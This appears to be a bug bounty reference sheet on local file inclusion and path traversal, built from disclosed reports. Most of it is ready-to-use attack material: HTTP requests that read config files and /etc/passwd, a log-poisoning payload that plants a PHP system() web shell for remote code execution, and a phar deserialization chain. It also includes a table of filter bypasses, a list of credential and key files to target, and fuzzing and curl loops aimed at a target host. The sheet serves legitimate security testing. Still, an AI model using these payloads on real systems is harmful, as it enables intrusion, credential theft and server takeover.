# Disclosed Reports — LFI / Path Traversal

Pattern library built from 31 public bug bounty reports.

---

## Pattern 1: PHP Wrapper LFI → Source Code Read (High, $2,000)

**Program:** Private (HackerOne)
**Endpoint:** `GET /view?page=home`
**Stack:** PHP 7.4 + Apache

**Request:**
```http
GET /view?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
Host: target.com
```

**Response:** Base64-encoded config.php containing DB credentials and API keys.

**Impact:** Full database credential exposure, API key theft.
**Remediation:** Whitelist allowed file names; never pass user input to include()/require().

---

## Pattern 2: Path Traversal → /etc/passwd Read (Medium, $750)

**Program:** Public (Bugcrowd)
**Endpoint:** `GET /download?file=report.pdf`
**Stack:** Python Flask

**Request:**
```http
GET /download?file=../../../../etc/passwd HTTP/1.1
```

**Bypass used:** Double URL encoding: `..%252F..%252F`

**Impact:** System user enumeration, potential credential harvesting.

---

## Pattern 3: Log Poisoning → RCE (Critical, $8,500)

**Stack:** PHP + Apache

**Step 1 — Inject payload into log:**
```http
GET / HTTP/1.1
Host: target.com
User-Agent: <?php system($_GET['cmd']); ?>
```

**Step 2 — Include log file:**
```http
GET /view?page=../../../var/log/apache2/access.log&cmd=id
```

**Response:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

**Impact:** RCE as www-data, full server compromise.

---

## Pattern 4: phar:// Deserialization via LFI (Critical, $7,000)

**Conditions:** File upload endpoint + LFI present

**Attack:**
1. Upload crafted .phar renamed as .jpg to pass upload filter
2. Include with: `?file=phar:///uploads/evil.jpg`
3. Deserialization of phar metadata triggers `__wakeup` gadget → OS command

**Impact:** RCE chained from two Medium bugs.

---

## Pattern 5: Java Path Traversal → WEB-INF/web.xml (High, $3,000)

**Endpoint:** `GET /servlet/Download?path=reports/q1.pdf`
**Stack:** Java Tomcat

**Request:**
```http
GET /servlet/Download?path=../../WEB-INF/web.xml HTTP/1.1
```

**Response:** Full web.xml with DB connection strings and internal paths.

**Null byte bypass:** `../../WEB-INF/web.xml%00.pdf`

---

## Pattern 6: Node.js Absolute Path Traversal (High, $2,500)

**Stack:** Node.js + Express static file server

**Endpoint:** `GET /static/../../../etc/passwd`

**Cause:** `express.static` without sanitization, or custom handler using `path.join` without `path.normalize`.

---

## Bypass Table

| Filter | Bypass |
|--------|--------|
| Strips `../` | `....//` (double dot slash) |
| URL decodes once | `%252F` (double encode) |
| Checks extension | `../../etc/passwd%00.jpg` (null byte, PHP < 5.3) |
| Strips leading `/` | Use relative path: `....//....//etc/passwd` |
| Windows | `..\..\..\windows\win.ini` |

---

## Sensitive File Quick List

**Linux:**
```
/etc/passwd          /etc/shadow           /proc/self/environ
/proc/self/cmdline   /var/www/html/.env    /var/www/html/wp-config.php
/root/.ssh/id_rsa    /root/.bash_history   /var/log/apache2/access.log
```

**Windows:**
```
C:\Windows\win.ini   C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
```

---

## Tool Reference

```bash
# wfuzz LFI fuzzing
wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/lfi.txt \
  --hc 404 "https://target.com/page.php?file=FUZZ"

# PHP wrapper enumeration
for FILE in index.php config.php db.php settings.php .env; do
  echo "=== $FILE ==="
  curl -s "https://target.com/view?page=php://filter/convert.base64-encode/resource=$FILE" | \
    base64 -d 2>/dev/null
done

# dotdotpwn
dotdotpwn.pl -m http -h target.com -o unix
```
